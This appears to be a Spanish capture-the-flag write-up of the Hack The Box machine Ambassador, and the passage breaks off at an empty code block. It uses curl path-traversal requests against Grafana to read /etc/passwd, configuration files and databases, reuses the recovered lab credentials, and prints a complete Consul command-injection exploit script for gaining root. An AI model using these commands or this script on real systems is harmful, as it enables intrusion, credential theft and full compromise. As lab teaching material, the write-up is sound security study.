---
title: "HTB: Resolución de Ambassador"
date: 2023-01-28 06:00:00 +/-TTTT
categories: [HTB, Linux]
tags: [consul,git,grafana,sqlite]     ## TAG names should always be lowercase
image: ambassador.jpg
img_path: /photos/2023-01-28-Ambassador-WriteUp/
---

***Ambassador*** es una máquina ***Linux*** con cuatro servicios expuestos: *SSH*, *Grafana*, *MySQL* y un servidor web *HTTP*. Primeramente, explotaremos una **vulnerabilidad** asociada a ***Grafana*** que nos permitirá **leer archivos internos de la máquina**, pudiendo así obtener las credenciales del usuario *grafana*. En una base de datos de ***MySQL*** encontraremos otras credenciales pertenecientes al usuario *develper*, con las que nos podremos conectar por ***SSH***. Finalmente, para conseguir **máximos privilegios**, explotaremos una vulnerabilidad asociada a la herramienta ***Consul***, a través de la cual conseguiremos ejecutar comandos como ***root***.


## Información de la máquina 

<table width="100%" cellpadding="2">
    <tr>
        <td>
            <img src="logo.png" alt="drawing" width="465"/>  
        </td>
        <td>
            <img src="stats.png" alt="drawing" width="400" />  
        </td>
    </tr>
</table>

## Reconocimiento

### ping 

Vamos a enviar un _ping_ a la máquina víctima con la finalidad de conocer su sistema operativo y saber si tenemos conexión con la misma. Un _TTL_ menor o igual a 64 significa que la máquina es _Linux_ y un _TTL_ menor o igual a 128 significa que la máquina es _Windows_.

```bash
ping -c 1 10.10.11.183
PING 10.10.11.183 (10.10.11.183) 56(84) bytes of data.
64 bytes from 10.10.11.183: icmp_seq=1 ttl=63 time=105 ms

--- 10.10.11.183 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 104.906/104.906/104.906/0.000 ms
```

Vemos que nos enfrentamos a una máquina **_Linux_**, ya que su *TTL* es 63.

### Port discovery

Procedemos ahora a escanear todo el rango de puertos de la máquina víctima con la finalidad de encontrar aquellos que estén abiertos (_status open_). Lo haremos con la herramienta ***nmap***.

```bash
sudo nmap -sS --min-rate 5000 -n -Pn -p- -vvv --open 10.10.11.183 -oG allPorts
Nmap scan report for 10.10.11.183
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63
```

**-sS** efectúa un _TCP SYN Scan_, iniciando rápidamente una conexión sin finalizarla.  
**-min-rate 5000** sirve para enviar paquetes no más lentos que 5000 paquetes por segundo.  
**-n** sirve para evitar resolución DNS.  
**-Pn** para evitar host discovery.  
**-vvv** triple _verbose_ para que nos vuelque la información que vaya encontrando el escaneo.  
**-p-** para escanear todo el rango de puertos.  
**-oG** exportará la evidencia en formato _grepeable_ al fichero *allPorts* en este caso.

Hemos encontrado **cuatro puertos abiertos**, el **22**, **80**, **3000** y **3306**. Un **puerto abierto** está **escuchando solicitudes de conexión entrantes**.

Vamos a lanzar una serie de _scripts_ básicos de enumeración en busca de los servicios que están corriendo y de sus versiones.

```python
nmap -sCV -p22,80,3000,3306 10.10.11.183 -oN targeted
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Hugo 0.94.2
|_http-title: Ambassador Development Server
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 21 Jan 2023 17:18:00 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 21 Jan 2023 17:17:28 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 21 Jan 2023 17:17:33 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 32
|   Capabilities flags: 65535
|   Some Capabilities: SupportsCompression, InteractiveClient, Speaks41ProtocolOld, ConnectWithDatabase, IgnoreSigpipes, SupportsTransactions, LongPassword, Speaks41ProtocolNew, FoundRows, SwitchToSSLAfterHandshake, ODBCClient, LongColumnFlag, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, Support41Auth, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: f|\!;4U3-R\x01JIfpbSp|\x11
|_  Auth Plugin Name: caching_sha2_password
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
```

* El puerto **22** es *SSH*.
* El puerto **80** está corriendo un servicio *HTTP*.
* El puerto **3000** parece ser otro **servicio web**.
* El puerto **3306** es *MySQL*.

Al no disponer de credenciales para autenticarnos por *SSH*, **empezaremos** auditando el **puerto 80**.

### Puerto 80 abierto (HTTP)

#### Tecnologías utilizadas

Utilizaremos **_whatweb_** para enumerar las tecnologías que corren detrás del servicio web:

```python
whatweb http://10.10.11.183
http://10.10.11.183 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.183], MetaGenerator[Hugo 0.94.2], Open-Graph-Protocol[website], Title[Ambassador Development Server], X-UA-Compatible[IE=edge
```

Está empleando como servidor web _Apache 2.4.41_. El título de la página es *Ambassador Development Server*.

#### Análisis de la web

La página principal tiene el siguiente aspecto:

![imagen 1](Pasted image 20230126233916.png)

Si pinchamos en el post, descubriremos la existencia de un usuario llamado *developer*. No encontraremos nada más interesante. Aplicaremos ***fuzzing*** para descubrir directorios.

#### Fuzzing de directorios

Vamos a **buscar directorios** que se encuentren bajo la URL `htpp://10.10.11.183/`. Lo haremos con la herramienta *gobuster*:

```bash
gobuster dir -u http://10.10.11.183 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.183
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/21 18:21:14 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.11.183/images/]
/categories           (Status: 301) [Size: 317] [--> http://10.10.11.183/categories/]
/posts                (Status: 301) [Size: 312] [--> http://10.10.11.183/posts/]     
/tags                 (Status: 301) [Size: 311] [--> http://10.10.11.183/tags/] 
```

**dir** para indicar que queremos aplicar *fuzzing* de directorios.
**-u** para especificar la _url_.  
**-w** para especificar el diccionario. Para _fuzzear_ directorios siempre suele emplear el mismo, _directory-list-2.3-medium.txt_. Este diccionario se puede encontrar en el propio _Parrot OS_ o en _Kali_. También se puede encontrar en el repositorio de [SecLists](https://github.com/danielmiessler/SecLists).  
**-t 200** para indicar la cantidad de **hilos** a usar (ejecuciones paralelas). A más hilos más rápido, pero menos fiable.  

Nos encuentra diversos directorios, que podemos explorar uno a uno, aunque una vez más no encontraremos nada relevante en ellos. Pasamos a auditar el servicio que corre en el **puerto 3000**.

### Puerto 3000 abierto (HTTP)

#### Tecnologías utilizadas 

Lanzaremos ***whatweb*** para cerciorarnos que el servicio que corre en el puerto 3000 es una página web y para saber las tecnologías que está utilizando.

```python
whatweb http://10.10.11.183:3000
http://10.10.11.183:3000 [302 Found] Cookies[redirect_to], Country[RESERVED][ZZ], HttpOnly[redirect_to], IP[10.10.11.183], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block]
http://10.10.11.183:3000/login [200 OK] Country[RESERVED][ZZ], Grafana[8.2.0], HTML5, IP[10.10.11.183], Script, Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

Se trata de ***Grafana 8.2.0***. A grandes rasgos, ***Grafana*** es una herramienta de visualización de datos *open source* que permite crear paneles y gráficos personalizados para mostrar información en tiempo real. 

#### Analizando Grafana 8.2.0

Al escribir `http://10.10.11.183:3000` en la barra de búsqueda, el navegador nos redirige a `http://10.10.11.183:3000/login`:

![imagen 2](Pasted image 20230126235158.png)

Podríamos intentar autenticarnos con credenciales por defecto, como `admin:admin`, `admin:admin123` o `administrator:administrator`, pero no conseguiremos acceder.

Como disponemos de la **versión**, podemos buscar ***exploits*** asociados a este servicio con la herramienta  *searchsploit*:

![imagen 3](Pasted image 20230126235616.png)

Aunque la versión de *Grafana* que estamos auditando es la *8.2.0*, el *exploit* *Grafana 8.3.0 - Directory Traversal and Arbitrary File Read* nos puede interesar, ya que se trata de una vulnerabilidad más reciente. 

## Shell como developer 

### Grafana 8.3.0 - Directory Traversal and Arbitrary File Read

Nos podemos bajar el *exploit* con el comando `searchsploit -m multiple/webapps/50581.py`.

Si inspeccionamos el *script*, nos damos cuenta de que la vulnerabilidad es sencilla de explotar. Básicamente, a través de un *Directory Path Traversal* (retrocediendo directorios con *../../../*) en `http://10.10.11.183:3000/public/plugins/<plugin_existente>/` podemos leer archivos de la máquina víctima, lo que se conoce como un *Local File Inclusion (LFI)*. 

Podemos emplear el *PoC* anterior o bien utilizar otras herramientas, como *curl*, para tramitar las peticiones.  En mi caso, usaré la segunda opción. El *script* ofrece un listado de *plugins* existentes. Por ejemplo, escogeré el *piechart*. La petición *curl* quedaría de la siguiente forma:

```bash
curl http://10.10.11.183:3000/public/plugins/piechart/../../../../../../../../../../../../../etc/passwd --path-as-is 
```

El *--path-as-is* de *curl* es para que nos interprete los *../../...* del *directory path traversal*.

El resultado es el archivo *passwd* de la máquina víctima:

```python
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
```

Usuarios que nos pueden interesar, ya que tienen asignada una *bash*, son *developer* y *root*.

En un sistema *Linux*, los **archivos de configuración** de *Grafana* se suelen encontrar en dos directorios:

* */etc/grafana*. Esta carpeta contiene archivos como *grafana.ini* (archivo de configuración principal), *custom.ini* (para agregar configuraciones personalizadas) y *provisioning* (que contiene configuraciones de recursos).

* */var/lib/grafana*. Los paneles y *dashboards* creados por los usuarios se almacenan en esta carpeta de datos. Si se está utilizando *SQLite*, la base de datos se encuentra también en esta carpeta. El nombre del archivo es *grafana.db*.

Empezaremos listando el contenido del archivo ***grafana.ini***, que como hemos dicho se encuentra en la ruta */etc/grafana* y contiene la **configuración principal**:

```bash
curl http://10.10.11.183:3000/public/plugins/piechart/../../../../../../../../../../../../../etc/grafana/grafana.ini --path-as-is > grafana.ini
```

Encontraremos la siguiente **credencial** en el archivo:

![imagen 4](Pasted image 20230127002802.png)

Se trata de la contraseña del usuario *admin*. Podemos utilizar las credenciales *admin:messageInABottle685427* en el panel de *login* para acceder al servicio.

El *dashboard* tiene el siguiente aspecto:

![imagen 5](Pasted image 20230127003017.png)

Aunque el aplicativo ofrece una gran cantidad de funcionalidades, no lograremos extraer información que nos pueda interesar. 

Recordemos que en la ruta */var/lib/grafana/* se encuentra la base de datos de *Grafana*, en el caso de que esté utilizando ***SQLite***. Vamos a intentar bajarnos el archivo:

```bash
curl http://10.10.11.183:3000/public/plugins/welcome/../../../../../../../../../../../../../var/lib/grafana/grafana.db --path-as-is > grafana.db
```

El archivo descargado tiene el siguiente formato:

```bash
grafana.db: SQLite 3.x database, last written using SQLite version 3035004
```

### Inspeccionando base de datos 

Para interactuar con la base de datos *SQLite* emplearemos la herramienta *SQLite3*. A continuación se presentan algunos comandos básicos de *SQLite3*:

* `sqlite3 nombre_bd.db`: Abre una base de datos existente.
* `.tables`: Muestra las tablas existentes en la base de datos.
* `.schema nombre_tabla`: Muestra la estructura de una tabla específica.
* `SELECT * FROM nombre_tabla;`: Selecciona todos los datos de una tabla específica.
* `.exit`: Salir de *SQLite3*.

Empezaremos enumerando las tablas:

```sql
sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              ngalert_configuration     
alert_notification          org                       
alert_notification_state    org_user                  
alert_rule                  playlist                  
alert_rule_tag              playlist_item             
alert_rule_version          plugin_setting            
annotation                  preferences               
annotation_tag              quota                     
api_key                     server_lock               
cache_data                  session                   
dashboard                   short_url                 
dashboard_acl               star                      
dashboard_provisioning      tag                       
dashboard_snapshot          team                      
dashboard_tag               team_member               
dashboard_version           temp_user                 
data_source                 test_data                 
kv_store                    user                      
library_element             user_auth                 
library_element_connection  user_auth_token   
```

El contenido de la tabla *users* nos puede interesar:

```sql
sqlite> select * from user;
1|0|admin|admin@localhost||dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069|0X27trve2u|f960YdtaMF||1|1|0||2022-03-13 20:26:45|2022-09-01 22:39:38|0|2023-01-21 22:09:27|0
```

La estructura de la tabla es la siguiente:

```sql
sqlite> .schema user
CREATE TABLE `user` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `version` INTEGER NOT NULL
, `login` TEXT NOT NULL
, `email` TEXT NOT NULL
, `name` TEXT NULL
, `password` TEXT NULL
, `salt` TEXT NULL
, `rands` TEXT NULL
, `company` TEXT NULL
, `org_id` INTEGER NOT NULL
, `is_admin` INTEGER NOT NULL
, `email_verified` INTEGER NULL
, `theme` TEXT NULL
, `created` DATETIME NOT NULL
, `updated` DATETIME NOT NULL
, `help_flags1` INTEGER NOT NULL DEFAULT 0, `last_seen_at` DATETIME NULL, `is_disabled` INTEGER NOT NULL DEFAULT 0);
CREATE UNIQUE INDEX `UQE_user_login` ON `user` (`login`);
CREATE UNIQUE INDEX `UQE_user_email` ON `user` (`email`);
CREATE INDEX `IDX_user_login_email` ON `user` (`login`,`email`);
```

Tenemos al usuario *admin* y una contraseña *hasheada*, que será *messageInABottle685427*. Por lo tanto, nada interesante.

Explorando un poco más, encontramos el siguiente contenido en la tabla *data_source*:

```sql
sqlite> select * from data_source;
2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-20 23:24:06|0|{}|1|uKewFgM4z
```

La estructura de esta tabla es la siguiente:

```sql
sqlite> .schema data_source 
CREATE TABLE `data_source` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `org_id` INTEGER NOT NULL
, `version` INTEGER NOT NULL
, `type` TEXT NOT NULL
, `name` TEXT NOT NULL
, `access` TEXT NOT NULL
, `url` TEXT NOT NULL
, `password` TEXT NULL
, `user` TEXT NULL
, `database` TEXT NULL
, `basic_auth` INTEGER NOT NULL
, `basic_auth_user` TEXT NULL
, `basic_auth_password` TEXT NULL
, `is_default` INTEGER NOT NULL
, `json_data` TEXT NULL
, `created` DATETIME NOT NULL
, `updated` DATETIME NOT NULL
, `with_credentials` INTEGER NOT NULL DEFAULT 0, `secure_json_data` TEXT NULL, `read_only` INTEGER NULL, `uid` TEXT NOT NULL DEFAULT 0);
CREATE INDEX `IDX_data_source_org_id` ON `data_source` (`org_id`);
CREATE UNIQUE INDEX `UQE_data_source_org_id_name` ON `data_source` (`org_id`,`name`);
CREATE UNIQUE INDEX `UQE_data_source_org_id_uid` ON `data_source` (`org_id`,`uid`);
CREATE INDEX `IDX_data_source_org_id_is_default` ON `data_source` (`org_id`,`is_default`);
```

Parece que los datos están relacionados con el servicio *MySQL*. Tenemos las credenciales *grafana:dontStandSoCloseToMe63221!*.

### Puerto 3306 abierto (MySQL)

Podemos emplear las credenciales anteriores para autenticarnos por *MySQL*. El comando que ingresaremos será:

```bash
mysql -u grafana -h 10.10.11.183 -pdontStandSoCloseToMe63221!
```

Una vez dentro:

1. Encontraremos una base de datos llamada *whackywidget*.
2. Esta contendrá una tabla *users*.
3. En el interior de la tabla encontraremos las credenciales *developer:YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg\==*

```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0,11 sec)

mysql> use whackywidget

Database changed
mysql> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0,11 sec)

mysql> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0,10 sec)
```

La contraseña está en *base64*. Para decodificarla aplicamos:

```bash
echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
```

Obtenemos *anEnglishManInNewYork027468*. Ahora nos podemos autenticar por ***SSH*** con esas credenciales.

### user.txt

Encontraremos la primera *flag* en el *homedir* del usuario *developer*:

```bash
-bash-5.0$ pwd
/home/developer
-bash-5.0$ cat user.txt 
aaa9ba53194fe9f7d66a4e25699826fd
```

## Consiguiendo shell como root 

### Reconocimiento del sistema como developer

#### Análisis de conexiones abiertas en escucha

Con el comando `netstat -auntp` listaremos las conexiones TCP/UDP establecidas y en escucha:

```bash
developer@ambassador:~$ netstat -auntp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -  
[...]
```

Nos interesan las que tienen estado *LISTEN*, ya que son los servicios que está exponiendo la máquina. 

* *3306 y 33060* corresponden a *MySQL*.
* *22* es SSH.
* *53* es DNS.
* *8300, 8301, 8302, 8500 y 8600* pertenecen a  ***Consul***. *Consul* es un sistema de descubrimiento y configuración de servicios distribuidos. Este servicio utiliza varios puertos para operar:
	* El puerto **8300** se utiliza para las comunicaciones entre los servidores de *Consul*.
	* El puerto **8301** se utiliza para las comunicaciones entre los clientes y los servidores de *Consul*.
	* El puerto **8302** se utiliza para las comunicaciones entre los servidores de *Consul* en un *cluster*.
	* El puerto **8500** se utiliza para el acceso a la **interfaz web** de *Consul*.
	* El puerto **8600** se utiliza para la integración de *DNS* de *Consul*, donde se resuelven los nombres de servicio a través de DNS.

Podemos interactuar con la herramienta a través del comando *consul* o enviando peticiones web al puerto **8500**. Ahora bien, para hacerlo, se suele necesitar un ***token de autenticación***. Por ejemplo, si ejecutamos sin autenticación `consul members` para mostrar la lista de miembros de un *cluster* de *consul*, no obtendremos información. En este punto, vamos a aplicar más reconocimiento en busca del *token* o de vías alternativas de escalada de privilegios.

#### Reconocimiento del sistema con LinPEAS

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) automatiza la recolección de información del sistema, como el uso de recursos, configuraciones de red, servicios en ejecución, permisos de archivos y procesos, y mucho más. 

El programa se puede transferir a la máquina víctima desplegando un servidor en _python_ `(python3 -m http.server 80)` compartiendo el fichero y luego en la máquina víctima en un directorio donde tengamos permisos de escritura (como _/tmp_ o _/dev/shm_) hacer un _wget_ para descargar el archivo.

Nos encuentra lo siguiente:

```bash
[...]
Analyzing Github Files (limit 70)
-rw-rw-r-- 1 developer developer 93 Sep  2 02:28 /home/developer/.gitconfig
drwxrwxr-x 8 root root 4096 Mar 14  2022 /opt/my-app/.git
[...]
```

Tenemos acceso a un *.git* que se encuentra en el directorio */opt/my-app*. Poseer acceso a esta carpeta puede ser peligroso, ya que a través de los *logs* de *git* se puede extraer información interesante. Una vez situados dentro de la carpeta *.git*, con el comando `git logs` podremos listar los *logs* y con el comando `git show <log_identifier>` mostraremos el contenido de un *log*.

El *log* **33a53ef9a207976d5ceceddc41a199558843bf3c** contiene la siguiente información:

```bash
developer@ambassador:/opt/my-app/.git$ git show 33a53ef9a207976d5ceceddc41a199558843bf3c
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 ## We use Consul for application config in production, this script will help set the correct values for the app
-## Export MYSQL_PASSWORD before running
+## Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

`-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD`es utilizado para guardar una contraseña en el almacén de clave-valor de *Consul* bajo la clave *whackywidget/db/mysql_pw*. Aparte, se está especificando un **token de autenticación** para tener acceso a esta clave. Esta es la pieza que nos faltaba para poder ejecutar los comandos de *Consul*.

Si volvemos a ejecutar `consul members` pero especificándole el *token* anterior, de la manera `consul members --token bb03b43b-1d81-d62b-24b5-39540ee469b5`, obtendremos información sobre cada uno de los nodos que forman parte del *cluster*:

```bash
developer@ambassador:/opt/my-app/whackywidget$ consul members -token=bb03b43b-1d81-d62b-24b5-39540ee469b5
Node        Address         Status  Type    Build   Protocol  DC   Partition  Segment
ambassador  127.0.0.1:8301  alive   server  1.13.2  2         dc1  default    <all>
```

En este caso, se muestra un solo nodo con el nombre *ambassador* que se encuentra en la dirección IP *127.0.0.1* y el puerto *8301* y su estado es *alive*.

### Consul RCE via Services API

Investigando en Internet alguna vía de escalada de privilegios a través de *Consul*, encuentro un [exploit](https://github.com/owalid/consul-rce) que explota una vulnerabilidad de **inyección de comandos en *Consul Api Services***. 

*"La vulnerabilidad existe en el parámetro ServiceID del endpoint de la API PUT /v1/agent/service/register. El parámetro ServiceID se utiliza para registrar un servicio con el agente Consul. El parámetro ServiceID no se sanitiza y permite la inyección de comandos."*

Por lo tanto, podríamos ejecutar comandos como el usuario que está corriendo la herramienta. El comando `ps -faux` nos muestra que *root* es el usuario que está corriendo *Consul*:

```bash
[...]
root        1088  0.3  3.9 795636 78268 ?        Ssl  06:23   1:18 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl
root        1095  0.0  0.1   6816  2984 ?        Ss   06:23   0:00 /usr/sbin/cron -f
[...]
```

El *exploit* es el [siguiente](https://github.com/owalid/consul-rce/blob/main/consul_rce.py):

```python
'''
- Author:      @owalid
- Description: This script exploits a command injection vulnerability in Consul
'''

import requests
import argparse
import time
import random
import string

def get_random_string():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(15))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-th", "--target_host", help="Target Host (REQUIRED)", type=str, required=True)
    parser.add_argument("-tp", "--target_port", help="Target Port (REQUIRED)", type=str, required=True)
    parser.add_argument("-c", "--command", help="Command to execute (REQUIRED)", type=str, required=True)
    parser.add_argument("-s", "--ssl", help="SSL", type=bool, required=False, default=False)
    parser.add_argument("-ct", "--consul-token", help="Consul Token", type=str, required=False)

    args = parser.parse_args()
    protocol = "https" if args.ssl else "http"
    url = f"{protocol}://{args.target_host}:{args.target_port}"
    consul_token = args.consul_token
    command = args.command
    headers = {'X-Consul-Token': consul_token} if consul_token else {}
    
    command_list = command.split(" ")
    id = get_random_string()

    data = {
        'ID': id,
        'Name': 'pwn',
        'Address': '127.0.0.1',
        'Port': 80,
        "Check": {
            "DeregisterCriticalServiceAfter": "90m",
            "Args": command_list,
            'Interval': '10s',
            "Timeout": "86400s",
        }
    }

    registerurl= f"{url}/v1/agent/service/register?replace-existing-checks=true"

    r = requests.put(registerurl, json=data, headers=headers, verify=False)

    if r.status_code != 200:
        print(f"[-] Error creating check {id}")
        print(r.text)
        exit(1)

    print(f"[+] Check {id} created successfully")
    time.sleep(12)
    desregisterurl = f"{url}/v1/agent/service/deregister/{id}"
    r = requests.put(desregisterurl, headers=headers, verify=False)

    if r.status_code != 200:
        print(f"[-] Error deregistering check {id}")
        print(r.text)
        exit(1)
    
    print(f"[+] Check {id} deregistered successfully")
```

Este *script* realiza una solicitud *PUT* a la *API* de *Consul* en el *endpoint* */v1/agent/service/register* con un cuerpo *JSON* que contiene información el servicio que va a ser registrado. El *script* también crea un *ID* aleatorio para el servicio. Si la solicitud es exitosa, el *script* imprime un mensaje indicando que el servicio ha sido creado. Luego espera 12 segundos y realiza otra solicitud *PUT* a la *API* de *Consul* en el *endpoint* */v1/agent/service/deregister/{id}* para cancelar el servicio, de nuevo imprimiendo un mensaje si es exitosa.

Los parámetros que le pasaremos al *script* son:

```bash
python3 consul_rce.py -th TARGET_HOST -tp TARGET_PORT -c COMMAND -ct CONSUL_TOKEN
```

En mi caso, voy a darle permisos *SUID* a la *bash*, para posteriormente *spawnearme* una *shell* como *root*:

```bash
